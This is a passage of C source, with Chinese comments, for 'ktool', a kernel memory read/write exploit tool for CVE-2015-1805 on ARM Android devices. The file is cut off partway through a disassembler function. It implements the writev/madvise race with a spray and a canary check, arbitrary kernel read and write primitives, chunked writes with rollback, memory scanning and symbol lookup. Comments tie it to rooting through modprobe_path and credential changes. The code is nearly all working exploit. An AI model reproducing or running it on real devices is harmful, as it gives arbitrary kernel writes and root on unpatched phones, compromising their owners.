/*
 * ktool.c — CVE-2015-1805 内核读写工具（P4.3）
 *
 *   ktool dump <hexaddr> <len>      从内核地址读并 hexdump（len 64 对齐）
 *   ktool read <hexaddr> <len>      读并以 binary 打到 stdout
 *   ktool kread_file <addr> <len> <out>   分块读大段内存落盘（P4.83）
 *   ktool kwrite_file <in> <addr>         分块写大段内存（尾块 RMW）
 *   ktool scan <start> <len> <pat> [n]    内核内存模式搜索（P4.83）
 *   ktool scan4 <start> <len> <v|lo-hi> [n] [-u]  指针搜索（P4.84）
 *   ktool sym <name|0xaddr> [-f map]      离线符号表查询（P4.83）
 *
 * 读：writev 方向。布局随 W 变：
 *   iov[0] = W（present 页）    iov[1] = 4080（zapper 页，缺页点）
 *   iov[2] = 4112 - W（present）
 *   第二轮 chars=4096 = (4096-W) + W → 越界 W 字节
 *   OOB 条目 siv[257+j] = {addr + 8j, 8}，j < W/8
 *
 * 编译：sh build.sh    （ARM GNU 交叉工具链 -static；本机已无 zig）
 */
#define _GNU_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <unistd.h>

#include "targets.h"

struct cap_hdr { uint32_t version; int pid; };
struct cap_data { uint32_t eff, perm, inh; };

static void show_caps(const char *tag)
{
	struct cap_hdr h = { 0x20080522, 0 };
	struct cap_data d[2];

	memset(d, 0, sizeof(d));
	if (syscall(__NR_capget, &h, d) != 0) {
		printf("%s capget errno=%d\n", tag, errno);
		return;
	}
	printf("%s eff=%08x perm=%08x inh=%08x\n", tag,
	       d[0].eff, d[0].perm, d[0].inh);
}


#define NSEG      257
#define IOVECS    512
#define PG        4096
#define TOTAL     8192
#define MAXW      2040              /* OOB 最多 2040 字节（255 条 iovec） */

static struct iovec viv[IOVECS] __attribute__((aligned(64)));
static struct iovec siv[IOVECS] __attribute__((aligned(64)));

static unsigned char *p0, *p2, *pR, *wbuf, *rbuf;
static int pfd[2];
static int udpfd = -1;
static volatile int stop, ready;
/*
 * P4.85：会话模式下不能一直烧 CPU。
 * 一次性进程里精灵/zapper 跑几百毫秒就随进程退出，代价可以忽略；
 * 但会话要活很久，空闲时还占两个核会把设备烤热、loadavg 拉到 7+，
 * 反过来降低后续竞态的成功率（P4.50 踩过）。
 * 所以只在"命令执行期间"放行，空闲时降到 2ms 一次的休眠轮询。
 * 一次性模式从不清零，行为与旧版完全一致。
 */
static volatile int spin_active = 1;

static void pin(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof(s), &s);
}

static void *zapper(void *a)
{
	(void)a;
	pin(1);
	ready = 1;
	while (!stop) {
		if (!spin_active) {
			usleep(2000);
			continue;
		}
		madvise(pR, PG, MADV_DONTNEED);
	}
	return NULL;
}

static void *spinner(void *a)
{
	volatile unsigned long x = 0;

	(void)a;
	while (!stop) {
		unsigned long i;

		if (!spin_active) {
			usleep(2000);
			continue;
		}
		for (i = 0; i < 1000000UL && !stop && spin_active; i++)
			x += i;
	}
	return NULL;
}

static void spray(void)
{
	struct mmsghdr m;

	memset(&m, 0, sizeof(m));
	m.msg_hdr.msg_iov = siv;
	m.msg_hdr.msg_iovlen = IOVECS;
	m.msg_hdr.msg_control = siv;
	m.msg_hdr.msg_controllen = IOVECS * sizeof(struct iovec);
	syscall(SYS_sendmmsg, udpfd, &m, 1, MSG_DONTWAIT);
}

static int read_exact(int fd, unsigned char *buf, size_t n)
{
	size_t got = 0;
	int spins = 0;

	while (got < n) {
		ssize_t r = read(fd, buf + got, n - got);
		if (r > 0) { got += r; spins = 0; }
		else if (r < 0 && (errno == EAGAIN || errno == EINTR)) {
			if (++spins > 5000) return -1;
			usleep(1);
		} else return -1;
	}
	return 0;
}

static void drain(void)
{
	unsigned char t[256];
	while (read(pfd[0], t, sizeof(t)) > 0)
		;
}

/*
 * kread: 读 len 字节（8 的倍数，<= MAXW，且 W 需 <= 4080）
 * 返回 0 成功；-1 失败（目标地址不可读）
 */
static uint64_t *canary_pg;

/*
 * P4.50：非 0 时给 kread/kwrite 一个硬超时。
 * 竞态不在状态时单次调用会跑满 300 次 try（writev+read 各一），
 * do_root 里 find_self + 5 次 kwrite_verify 合计可达十万次，
 * 期间 spinner 线程一直占 CPU 并在内核态留下杀不掉的忙等线程，
 * 反过来让后续竞态更难赢（loadavg 自我放大到 7+ 且不回落）。
 * 设了预算后失败会快速返回，不再拖住系统。默认 0 = 不限（保持旧行为）。
 */
static time_t g_io_deadline;
static int g_timeout_sec;	/* -t：每条命令的 IO 预算（0=不限） */

/*
 * P4.86-B7：自适应退避 + 竞态统计。
 *
 * 原来失败就立刻重试，300 次连打。问题有两个：
 *   1) 连续失败说明"当前不在状态"，此时猛打只会把 loadavg 推高，
 *      反而更难赢（P4.50 实测 loadavg 自我放大到 7+ 不回落）；
 *   2) 没有任何计数器，谁也说不清一次读到底试了几次、慢在哪。
 *
 * 退避策略很轻：连续失败 3 次后才开始睡，每多失败一次 +200µs，封顶 2ms。
 * 成功一次立刻清零。300 次全失败最坏多花 ~0.6s，但换来的是不再把系统压垮。
 * 用 KTOOL_NOBACKOFF=1 可以关掉做 A/B 对比。
 */
static unsigned g_fail_streak;
static unsigned g_tries_sum;	/* 累计 try 次数（bench 用） */
static int g_backoff = -1;	/* -1 = 尚未读环境变量 */

/*
 * P4.86-C8：单次读最多试几次。
 *
 * 普通读写用 300 次（宁可慢也要读对）；但扫描时"这个地址到底映没映射"
 * 只需要一个快速判决——实测平均 2.6 次就中，24 次连续失败的概率约 3e-5，
 * 足够判定为空洞。原来空洞也跑满 300 次 + 退避，一个 4KB 空洞要 ~0.6s，
 * 64KB 未映射区扫了 14 秒；改成 24 次后同样的活降到零点几秒。
 */
static int g_max_tries = 300;
/*
 * 确认读期间关掉退避：这次读本来就是"验证到底能不能读"，
 * 大概率失败，退避只会把一次 15ms 的判决拖成 600ms。
 */
static int g_quiet;

static int backoff_on(void)
{
	if (g_backoff < 0) {
		const char *e = getenv("KTOOL_NOBACKOFF");

		g_backoff = (e && *e && *e != '0') ? 0 : 1;
	}
	return g_backoff;
}

static void race_backoff(void)
{
	unsigned us;

	if (!backoff_on() || g_fail_streak <= 2)
		return;
	/* 探测模式 / 确认读：本来就只试几次或明知会失败，退避得不偿失 */
	if (g_max_tries < 64 || g_quiet)
		return;
	us = (g_fail_streak - 2) * 200;
	if (us > 2000)
		us = 2000;
	usleep(us);
}

static int iovyroot_read(unsigned long addr, void *out, int len)
{
	int j, tries, w;
	uint64_t nonce;

	if (len <= 0 || len > 2000 || (len & 7)) {
		fprintf(stderr, "kread: bad len %d\n", len);
		return -1;
	}
	w = len + 8;                        /* OOB = canary(8) + data(len) */

	viv[0].iov_len = w;
	viv[1].iov_len = 4080;
	viv[2].iov_len = 4112 - w;

	for (j = 257; j < IOVECS; j++)
		siv[j].iov_len = 0;
	siv[257].iov_base = canary_pg;      /* 自校验：读回的第一个 8 字节必须等于它 */
	siv[257].iov_len = 8;
	for (j = 0; j < len / 8; j++) {
		siv[258 + j].iov_base = (void *)(addr + j * 8);
		siv[258 + j].iov_len = 8;
	}

	for (tries = 0; tries < g_max_tries; tries++) {
		ssize_t r;
		uint64_t got;

		if (g_io_deadline && time(NULL) > g_io_deadline)
			return -1;

		nonce = 0x9e3779b97f4a7c15ULL * (uint64_t)(tries + 1)
			+ (uint64_t)addr + (uint64_t)len;
		*canary_pg = nonce;
		spray();
		r = writev(pfd[1], viv, NSEG);
		if (r == TOTAL) {
			if (read_exact(pfd[0], rbuf, TOTAL) != 0) return -1;
			memcpy(&got, rbuf + TOTAL - w, 8);
			if (got == nonce) {          /* canary 对上 → 残留确实是我们的 */
				memcpy(out, rbuf + TOTAL - w + 8, len);
				g_fail_streak = 0;
				g_tries_sum += tries + 1;
				return 0;
			}
		} else {
			drain();
		}
		g_fail_streak++;
		race_backoff();
	}
	g_tries_sum += g_max_tries;
	return -1;
}

static int iovyroot_write(unsigned long addr, const void *data, int len)
{
	int j, tries;

	if (len <= 0 || len > 4000 || (len & 7)) {
		fprintf(stderr, "kwrite: bad len %d\n", len);
		return -1;
	}
	viv[0].iov_len = len;
	viv[1].iov_len = 4080;
	viv[2].iov_len = 4112 - len;

	for (j = 257; j < IOVECS; j++)
		siv[j].iov_len = 0;
	for (j = 0; j < len / 8; j++) {
		siv[257 + j].iov_base = (void *)(addr + j * 8);
		siv[257 + j].iov_len = 8;
	}

	for (tries = 0; tries < g_max_tries; tries++) {
		ssize_t r;

		if (g_io_deadline && time(NULL) > g_io_deadline)
			return -1;

		memset(wbuf, 0, TOTAL);
		memcpy(wbuf + TOTAL - len, data, len);
		spray();
		if (write(pfd[1], wbuf, TOTAL) != TOTAL) return -1;
		r = readv(pfd[0], viv, NSEG);
		/*
		 * P4.88：无论成败都要把管道抽干。
		 * 之前只在失败时抽；写成功时残留的数据会污染紧随其后的读——
		 * 实测读回会拿到"刚写入的值"或"旧值"（wtest 完整模式里读回说
		 * euid=0，同一时刻 geteuid()=2000），写校验结果整个判反。
		 */
		drain();
		if (r == TOTAL)
			return 0;
		g_fail_streak++;
		race_backoff();
	}
	return -1;
}

/*
 * P4.83：读原语后端接口。
 *
 * 目前只有 iovyroot（CVE-2015-1805 的 writev+madvise 竞态）一个实现，
 * 但业务逻辑（do_root / find_self / dump / scan / 模块辅助）只通过
 * kread()/kwrite() 访问，不再直接碰精灵与 iovec 细节。
 * 换机型时只需再实现一个 backend，调用方零改动。
 *
 * 新后端约定：
 *   read/write  len 必须是 8 的倍数（上层负责补齐），返回 0 成功 / -1 失败；
 *   probe       用一次已知地址的读自检，不触发写、不改变系统状态。
 */
struct krw_backend {
	const char *name;
	int (*read)(unsigned long addr, void *buf, int len);
	int (*write)(unsigned long addr, const void *buf, int len);
	int (*probe)(void);
	unsigned max_read;	/* 单次读上限（字节，8 的倍数） */
	unsigned max_write;	/* 单次写上限 */
};

/* 定义在 g_t 之后（probe 需要 init_task） */
static int krw_probe(void);

static const struct krw_backend krw_iovyroot = {
	"iovyroot/1805", iovyroot_read, iovyroot_write, krw_probe, 2000, 4000
};

static const struct krw_backend *g_krw = &krw_iovyroot;

static int kread(unsigned long addr, void *out, int len)
{
	if (!g_krw || !g_krw->read)
		return -1;
	return g_krw->read(addr, out, len);
}

static int kwrite(unsigned long addr, const void *data, int len)
{
	if (!g_krw || !g_krw->write)
		return -1;
	return g_krw->write(addr, data, len);
}

/*
 * 写 + 读回校验。
 *
 * 注意 b[] 的大小：调用方最大传 256（modprobe_path 那段），
 * 原来这里是 64 —— 读回 256 字节直接踩栈，表现为 enforce/restore 时
 * 随机段错误（P4.88 抓到）。上限与调用方对齐，别改大不改小。
 */
static int kwrite_verify(unsigned long addr, const void *data, int len)
{
	unsigned char b[256];
	int i;

	if (len <= 0 || len > (int)sizeof(b)) return -1;
	for (i = 0; i < 30; i++) {
		if (kwrite(addr, data, len) == 0 &&
		    kread(addr, b, len) == 0 && !memcmp(b, data, len))
			return 0;
	}
	return -1;
}

/* ======================================================================
 * P4.83：大块 IO —— 把 backend 的单次上限（2000/4000）藏起来
 *
 * 上层（落盘、扫描、结构转储）只说「读/写 N 字节」，分块、补齐、
 * 逐块校验都在这一层做；换 backend 时上层零改动。
 *
 * backend 约定 len 必须是 8 的倍数，所以：
 *   kread_raw   要求 len 8 对齐，写满 out
 *   kread_buf   len 任意；多读出的尾字节落到 bounce 里丢弃，
 *               不越界写调用方缓冲区
 *   kwrite_buf  len 任意；尾块「读 8 字节原值 → 拼接 → 整块写回」，
 *               只有目标那 n 个字节变化，不留半改状态
 * ==================================================================== */

#define KT_BOUNCE 2048

static int kread_raw(unsigned long addr, void *out, int len)
{
	unsigned char *p = out;
	int off = 0, chunk;

	if (len <= 0 || (len & 7))
		return -1;
	chunk = g_krw->max_read ? (int)g_krw->max_read : 2000;
	chunk &= ~7;
	if (chunk <= 0)
		return -1;
	while (off < len) {
		int n = len - off;

		if (n > chunk)
			n = chunk;
		if (kread(addr + off, p + off, n) != 0)
			return -1;
		off += n;
	}
	return 0;
}

static int kread_buf(unsigned long addr, void *out, int len)
{
	static unsigned char bounce[KT_BOUNCE];
	unsigned char *p = out;
	int off = 0, cap = (int)sizeof(bounce) & ~7;

	if (len <= 0)
		return -1;
	while (off < len) {
		int n = len - off, rn;

		if (n > cap)
			n = cap;
		rn = (n + 7) & ~7;
		if (kread_raw(addr + off, bounce, rn) != 0)
			return -1;
		memcpy(p + off, bounce, n);
		off += n;
	}
	return 0;
}

static int kwrite_verify_buf(unsigned long addr, const void *data, int len)
{
	unsigned char *b = malloc(len);
	int i, ok = -1;

	if (!b)
		return -1;
	for (i = 0; i < 30; i++) {
		/*
		 * 读回的可信度依赖 iovyroot_write 里的 drain()（P4.88）。
		 * 在 drain 修好之前，这里即使写成功了也会读到污染数据，
		 * 表现为"块明明落地了却报 FAIL"。
		 */
		if (kwrite(addr, data, len) != 0)
			continue;
		if (kread_raw(addr, b, len) != 0)
			continue;
		if (!memcmp(b, data, len)) {
			ok = 0;
			break;
		}
	}
	free(b);
	return ok;
}

static int kwrite_buf(unsigned long addr, const void *in, int len)
{
	const unsigned char *p = in;
	unsigned char tail[16];
	int off = 0, chunk;

	if (len <= 0)
		return -1;
	/*
	 * P4.87：固定按 8 字节一块，**不用 backend 的 max_write(4000)**。
	 * wtest 实测（每次独立一次 kwrite，kwrite 一律返回 0）：
	 *   len=8 5/5 全落地 / len=16 1/5 / len=32 0/5 / len=48 0/5 / len=72 1/5
	 * 大长度写即使"成功"也可能一个字节都没落地，只能靠写后读回比对发现。
	 * 8 字节块逐块校验是实测最稳的；代价是批量写变慢（1MB 约 1 分钟），
	 * 但"静默半改"正是 B4 要消灭的东西。
	 */
	chunk = 8;
	while (off < len) {
		int n = len - off;

		if (n >= chunk) {
			if (kwrite_verify_buf(addr + off, p + off, chunk) != 0)
				return -1;
			off += chunk;
			continue;
		}
		if ((n & 7) == 0)
			return kwrite_verify_buf(addr + off, p + off, n);
		if (kread_raw(addr + off, tail, 8) != 0)
			return -1;
		memcpy(tail, p + off, n);
		return kwrite_verify_buf(addr + off, tail, 8);
	}
	return 0;
}

/* ======================================================================
 * P4.86-B4：写事务（undo 日志 + 失败自动回滚）
 *
 * 原来的问题：多块写中途失败，前面的块已经改了，后面没改，目标停在半改状态。
 * 现在：
 *   1. 先把整段原值读下来（快照）；
 *   2. 快照落盘成 undo 日志 /data/local/tmp/ktool_undo.bin，
 *      这样即使进程崩了，也能用 `ktool undo` 还原；
 *   3. 逐块写；任一块失败 → 立刻用内存里的快照回滚已写的部分；
 *   4. 回滚也失败时，明确告诉用户去用 undo 文件。
 * 目标不可读（快照失败）时退化为非事务写，并明确提示——不假装有保护。
 * ==================================================================== */

#define KT_UNDO_FILE "/data/local/tmp/ktool_undo.bin"
#define KT_UNDO_MAGIC 0x4b544258U	/* "KTBX" */

struct kt_undo_hdr {
	unsigned int magic;
	unsigned int len;
	unsigned long addr;
};

static int kt_undo_save(unsigned long addr, const void *data, int len)
{
	struct kt_undo_hdr h;
	FILE *f = fopen(KT_UNDO_FILE, "wb");

	if (!f)
		return -1;
	h.magic = KT_UNDO_MAGIC;
	h.len = (unsigned int)len;
	h.addr = addr;
	if (fwrite(&h, sizeof(h), 1, f) != 1 ||
	    fwrite(data, 1, len, f) != (size_t)len) {
		fclose(f);
		return -1;
	}
	fclose(f);
	return 0;
}

static int kwrite_txn(unsigned long addr, const void *data, int len, int use_undo)
{
	unsigned char *bak;
	int r;

	bak = malloc(len);
	if (!bak)
		return -1;
	if (kread_buf(addr, bak, len) != 0) {
		printf("! 0x%08lx 读不到（无法快照），退化为非事务写\n", addr);
		free(bak);
		return kwrite_buf(addr, data, len);
	}
	if (use_undo && kt_undo_save(addr, bak, len) != 0)
		printf("! undo 日志写不进 %s（继续，但崩了就没法还原）\n", KT_UNDO_FILE);

	r = kwrite_buf(addr, data, len);
	if (r != 0) {
		printf("! 写失败，用快照回滚 %d 字节 @0x%08lx ...\n", len, addr);
		if (kwrite_buf(addr, bak, len) == 0) {
			printf("  回滚成功，目标已还原\n");
		} else {
			printf("  回滚失败！目标可能半改。原值：\n");
			if (len <= 64) {
				int i;

				printf("   ");
				for (i = 0; i < len; i++)
					printf("%02x", bak[i]);
				printf("\n");
			} else {
				printf("   用 ktool undo 从 %s 还原\n", KT_UNDO_FILE);
			}
		}
	}
	free(bak);
	return r;
}

/* ======================================================================
 * P4.83：离线符号表（System.map / kallsyms.txt）
 *
 * 不走模块的 ksym：模块要 insmod、要 uid0、偏移还随内核变；
 * 一份纯文本 map 推到 /data/local/tmp 就能用，换机型只换文件。
 * 两种格式都吃：
 *   c0008000 T _stext      标准 System.map（地址 类型 名字）
 *   c0008000 T_stext       kallsyms_extract.py 的两段式（类型粘在名字前）
 * ==================================================================== */

struct sym_hit {
	unsigned long addr;
	char type;
	char name[136];
};

static const char *kt_sym_paths[] = {
	"/data/local/tmp/System.map",
	"/data/local/tmp/kallsyms.txt",
	"./System.map",
	"./kallsyms.txt",
	"/sdcard/System.map",
	"/sdcard/kallsyms.txt",
	0
};

static const char *kt_sym_pick_file(void)
{
	const char *env = getenv("KTOOL_MAP");
	int i;

	if (env && env[0] && access(env, R_OK) == 0)
		return env;
	for (i = 0; kt_sym_paths[i]; i++)
		if (access(kt_sym_paths[i], R_OK) == 0)
			return kt_sym_paths[i];
	return 0;
}

/* 返回 0 成功。会就地改写 line。 */
static int kt_sym_parse_line(char *line, struct sym_hit *h)
{
	char *p = line, *a, *b, *c;

	while (*p == ' ' || *p == '\t')
		p++;
	if (!*p || *p == '#' || *p == '\n' || *p == '\r')
		return -1;
	a = p;
	while (*p && *p != ' ' && *p != '\t' && *p != '\n')
		p++;
	if (!*p)
		return -1;
	*p++ = 0;
	h->addr = strtoul(a, NULL, 16);
	if (!h->addr)
		return -1;
	while (*p == ' ' || *p == '\t')
		p++;
	if (!*p || *p == '\n' || *p == '\r')
		return -1;
	b = p;
	while (*p && *p != ' ' && *p != '\t' && *p != '\n')
		p++;
	if (*p)
		*p++ = 0;
	if (strlen(b) == 1) {
		/* 三段式：类型单独一段，名字在后面 */
		h->type = b[0];
		while (*p == ' ' || *p == '\t')
			p++;
		c = p;
		while (*p && *p != '\n' && *p != '\r')
			p++;
		*p = 0;
		snprintf(h->name, sizeof(h->name), "%s", c);
	} else {
		/* 两段式：首字符是类型 */
		h->type = b[0];
		snprintf(h->name, sizeof(h->name), "%s", b + 1);
	}
	/* Windows 上生成的表是 CRLF，名字尾部会带 \r，必须剪掉 */
	{
		size_t n = strlen(h->name);

		while (n && (h->name[n - 1] == '\r' || h->name[n - 1] == '\n' ||
			     h->name[n - 1] == ' ' || h->name[n - 1] == '\t'))
			h->name[--n] = 0;
	}
	return h->name[0] ? 0 : -1;
}

/* 只支持 * 和 ?，够用了；符号名很短，递归深度不是问题 */
static int kt_glob(const char *pat, const char *s)
{
	if (!*pat)
		return !*s;
	if (*pat == '*') {
		while (*pat == '*')
			pat++;
		if (!*pat)
			return 1;
		for (; *s; s++)
			if (kt_glob(pat, s))
				return 1;
		return 0;
	}
	if (!*s)
		return 0;
	if (*pat == '?' || *pat == *s)
		return kt_glob(pat + 1, s + 1);
	return 0;
}

static int kt_is_hex(const char *s)
{
	if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X'))
		s += 2;
	if (!*s)
		return 0;
	for (; *s; s++)
		if (!isxdigit((unsigned char)*s))
			return 0;
	return 1;
}

static unsigned long kt_hexval(const char *s)
{
	if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X'))
		return strtoul(s + 2, NULL, 16);
	return strtoul(s, NULL, 16);
}

/* 单个名字 → 地址（第一个精确匹配）。给 walk 之类"要一个地址"的场景用。 */
static int kt_sym_lookup(const char *name, unsigned long *out)
{
	const char *file = kt_sym_pick_file();
	struct sym_hit s;
	char line[512];
	FILE *f;
	int found = -1;

	if (!file || !(f = fopen(file, "r")))
		return -1;
	while (fgets(line, sizeof(line), f)) {
		if (kt_sym_parse_line(line, &s) != 0)
			continue;
		if (!strcmp(s.name, name)) {
			*out = s.addr;
			found = 0;
			break;
		}
	}
	fclose(f);
	return found;
}

/* 数值 → "Dinit_cred+0x0"；查不到返回 -1 并清空 out */
static int kt_sym_fmt(unsigned long v, char *out, size_t sz)
{
	const char *file = kt_sym_pick_file();
	struct sym_hit s, best;
	char line[512];
	FILE *f;

	out[0] = 0;
	if (!file || !(f = fopen(file, "r")))
		return -1;
	memset(&best, 0, sizeof(best));
	while (fgets(line, sizeof(line), f)) {
		if (kt_sym_parse_line(line, &s) != 0)
			continue;
		if (s.addr > v || s.addr < best.addr)
			continue;
		if (s.addr == best.addr && !isupper((unsigned char)s.type))
			continue;
		best = s;
	}
	fclose(f);
	if (!best.addr || v - best.addr > 0x100000)
		return -1;
	snprintf(out, sz, "%c%s+0x%lx", best.type, best.name, v - best.addr);
	return 0;
}

static int kt_cmd_sym(int argc, char **argv)
{
	const char *file = 0, *q = 0;
	char line[512];
	struct sym_hit h;
	unsigned long want = 0, best_addr = 0, next_addr = 0;
	char best_name[136] = "", next_name[136] = "";
	char best_type = 0, next_type = 0;
	int i, rev = 0, hits = 0, maxhits = 32, isglob;
	FILE *f;

	for (i = 2; i < argc; i++) {
		if (!strcmp(argv[i], "-f") && i + 1 < argc) {
			file = argv[++i];
		} else if (!strcmp(argv[i], "-a")) {
			rev = 1;
		} else if (!strcmp(argv[i], "-n") && i + 1 < argc) {
			maxhits = atoi(argv[++i]);
		} else if (!q) {
			q = argv[i];
		}
	}
	if (!q) {
		fprintf(stderr,
			"usage: sym <name|name*wild|0xADDR> [-a] [-f mapfile] [-n max]\n"
			"      默认按顺序找: $KTOOL_MAP, /data/local/tmp/System.map,\n"
			"                    /data/local/tmp/kallsyms.txt, ./System.map, ...\n");
		return 1;
	}
	if (!file)
		file = kt_sym_pick_file();
	if (!file) {
		fprintf(stderr, "找不到符号表；用 -f <file> 指定，或 push 到 "
				"/data/local/tmp/System.map\n");
		return 2;
	}
	f = fopen(file, "r");
	if (!f) {
		perror(file);
		return 2;
	}
	isglob = !rev && (strchr(q, '*') || strchr(q, '?'));

	if (!rev) {
		while (fgets(line, sizeof(line), f)) {
			if (kt_sym_parse_line(line, &h) != 0)
				continue;
			if (!strcmp(h.name, q) || (isglob && kt_glob(q, h.name))) {
				if (hits < maxhits)
					printf("0x%08lx %c %s\n", h.addr, h.type, h.name);
				hits++;
			}
		}
		if (hits) {
			fclose(f);
			if (hits > maxhits)
				printf("... 共 %d 个匹配，只显示前 %d 个（-n 调大）\n",
				       hits, maxhits);
			return 0;
		}
		if (!kt_is_hex(q)) {
			fclose(f);
			printf("no match: %s\n", q);
			return 1;
		}
		printf("(没有叫 \"%s\" 的符号，按地址反查)\n", q);
		rewind(f);
	}

	/* 反向：nearest <= want，同时记住 > want 的最近一个当区间上界 */
	want = kt_hexval(q);
	while (fgets(line, sizeof(line), f)) {
		if (kt_sym_parse_line(line, &h) != 0)
			continue;
		if (h.addr <= want) {
			if (h.addr > best_addr ||
			    (h.addr == best_addr && isupper((unsigned char)h.type) &&
			     !isupper((unsigned char)best_type))) {
				best_addr = h.addr;
				best_type = h.type;
				snprintf(best_name, sizeof(best_name), "%s", h.name);
			}
		} else if (!next_addr || h.addr < next_addr) {
			next_addr = h.addr;
			next_type = h.type;
			snprintf(next_name, sizeof(next_name), "%s", h.name);
		}
	}
	fclose(f);

	if (!best_addr) {
		printf("0x%08lx: 低于符号表首地址，无匹配\n", want);
		return 1;
	}
	printf("0x%08lx = %c%s+0x%lx  (base 0x%08lx", want, best_type,
	       best_name, want - best_addr, best_addr);
	if (next_addr)
		printf(", next 0x%08lx %c%s, span 0x%lx", next_addr,
		       next_type, next_name, next_addr - best_addr);
	printf(")\n");
	return 0;
}

/* ---------------- P4.83：模式解析与命中打印 ---------------- */

/* "s:ktool" → ASCII；"9e 37 79 b9" / "0x9e3779b9" → 字节序列 */
static int kt_parse_pattern(const char *s, unsigned char *out, int max)
{
	unsigned char dig[512];
	int n = 0, nd = 0;

	if (!strncmp(s, "s:", 2)) {
		n = (int)strlen(s + 2);
		if (n > max)
			n = max;
		memcpy(out, s + 2, n);
		return n;
	}
	while (*s && nd < (int)sizeof(dig) - 1) {
		if (isxdigit((unsigned char)*s))
			dig[nd++] = *s;
		else if (*s == ' ' || *s == ':' || *s == ',' || *s == '_' ||
			 *s == '-' || *s == 'x' || *s == 'X')
			;	/* 分隔符与 0x 前缀都丢掉 */
		else
			return -1;
		s++;
	}
	if (nd < 2 || (nd & 1))
		return -1;
	for (n = 0; n < nd / 2 && n < max; n++) {
		char t[3];

		t[0] = dig[2 * n];
		t[1] = dig[2 * n + 1];
		t[2] = 0;
		out[n] = (unsigned char)strtoul(t, NULL, 16);
	}
	return n;
}

static void kt_print_hit(unsigned long a, const unsigned char *p, int n)
{
	int i;

	printf("0x%08lx:", a);
	for (i = 0; i < n; i++)
		printf(" %02x", p[i]);
	printf("  |");
	for (i = 0; i < n; i++)
		printf("%c", isprint((unsigned char)p[i]) ? p[i] : '.');
	printf("|\n");
}

static uint32_t kt_rd32(const unsigned char *p)
{
	return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
	       ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

/* ---------------- P4.86-C8：ARM32 最小反汇编 ---------------- */

/*
 * 只解"验证补丁点"真正需要的那些编码：分支、svc、movw/movt、
 * 立即数运算、load/store、push/pop、ldm/stm。
 * 解不出来的一律 `.word 0x...`——**绝不猜**。
 * 猜错的反汇编比没有反汇编更危险。
 */
static const char *kt_reg(int r)
{
	static const char *n[16] = {
		"r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7",
		"r8", "r9", "r10", "r11", "r12", "sp", "lr", "pc"
	};
	return n[r & 15];
}

static const char *kt_cond_name(int c)
{
	static const char *n[16] = {
		"eq", "ne", "cs", "cc", "mi", "pl", "vs", "vc",
		"hi", "ls", "ge", "lt", "gt", "le", "", ""
	};
	return n[c & 15];
}

static void kt_reglist(unsigned int m, char *out, int sz)
{
	int i, k = 0;

	out[0] = 0;
	for (i = 0; i < 16; i++) {
		if (!(m & (1u << i)))
			continue;
		k += snprintf(out + k, sz - k, "%s%s", k ? "," : "", kt_reg(i));
		if (k >= sz - 8)
			break;
	}
	if (!out[0])
		snprintf(out, sz, "{}");
}

static void kt_dis_one(unsigned long addr, uint32_t w)
{
	int cond = (int)(w >> 28);
	const char *c = kt_cond_name(cond);

	/* B / BL */
	if ((w & 0x0e000000u) == 0x0a000000u && cond != 0xf) {
		int32_t off = (int32_t)(w & 0x00ffffffu);

		if (off & 0x00800000)
			off |= (int32_t)0xff000000;
		printf("b%s%s 0x%08lx", (w & 0x01000000u) ? "l" : "", c,
		       addr + 8 + ((unsigned long)(int32_t)(off << 2)));
		return;
	}
	/* BLX imm */
	if ((w & 0xfe000000u) == 0xfa000000u) {
		int32_t off = (int32_t)(w & 0x00ffffffu);

		if (off & 0x00800000)
			off |= (int32_t)0xff000000;
		printf("blx 0x%08lx", ((addr + 8) & ~3UL) + (unsigned long)(off << 2));
		return;
	}
	/* 无条件指令空间（cond=1111）：dmb/dsb/PLD/coproc 都在这。
	 * 除 BLX imm（已在上面处理）外一律不猜——曾把 f57ff05f(dsb) 解成 ldrb。 */
	if (cond == 0xf) {
		printf(".word 0x%08x", w);
		return;
	}
	/* BX / BLX reg */
	if ((w & 0x0ffffff0u) == 0x012fff10u) {
		printf("bx%s %s", c, kt_reg(w & 15));
		return;
	}
	if ((w & 0x0ffffff0u) == 0x012fff30u) {
		printf("blx%s %s", c, kt_reg(w & 15));
		return;
	}
	/* SVC */
	if ((w & 0x0f000000u) == 0x0f000000u) {
		printf("svc%s #0x%x", c, w & 0xffffff);
		return;
	}
	/* MOVW / MOVT */
	if ((w & 0x0fb00000u) == 0x03000000u) {
		unsigned int imm = ((w >> 16) & 0xf) << 12 | (w & 0xfff);

		printf("mov%s%s %s, #0x%x", (w & 0x00400000u) ? "t" : "w", c,
		       kt_reg((w >> 12) & 15), imm);
		return;
	}
	/* 立即数数据处理 */
	if ((w & 0x0e000000u) == 0x02000000u) {
		static const char *op[16] = {
			"and", "eor", "sub", "rsb", "add", "adc", "sbc", "rsc",
			"tst", "teq", "cmp", "cmn", "orr", "mov", "bic", "mvn"
		};
		unsigned int o = (w >> 21) & 15, s = (w >> 20) & 1;
		unsigned int rn = (w >> 16) & 15, rd = (w >> 12) & 15;
		unsigned int rot = ((w >> 8) & 15) * 2, imm = w & 0xffu;

		imm = (imm >> rot) | (imm << (32 - rot));
		if (o == 13 || o == 15)		/* mov / mvn */
			printf("%s%s%s %s, #0x%x", op[o], c, s ? "s" : "",
			       kt_reg(rd), imm);
		else if (o >= 8 && o <= 11)	/* tst/teq/cmp/cmn */
			printf("%s%s %s, #0x%x", op[o], c, kt_reg(rn), imm);
		else
			printf("%s%s%s %s, %s, #0x%x", op[o], c, s ? "s" : "",
			       kt_reg(rd), kt_reg(rn), imm);
		return;
	}
	/* 寄存器形式的数据处理：mov r0, r1 / add r0, r1, r2 / cmp r0, r1 ... */
	if ((w & 0x0e000000u) == 0x00000000u) {
		static const char *op[16] = {
			"and", "eor", "sub", "rsb", "add", "adc", "sbc", "rsc",
			"tst", "teq", "cmp", "cmn", "orr", "mov", "bic", "mvn"
		};
		static const char *shn[4] = { "lsl", "lsr", "asr", "ror" };
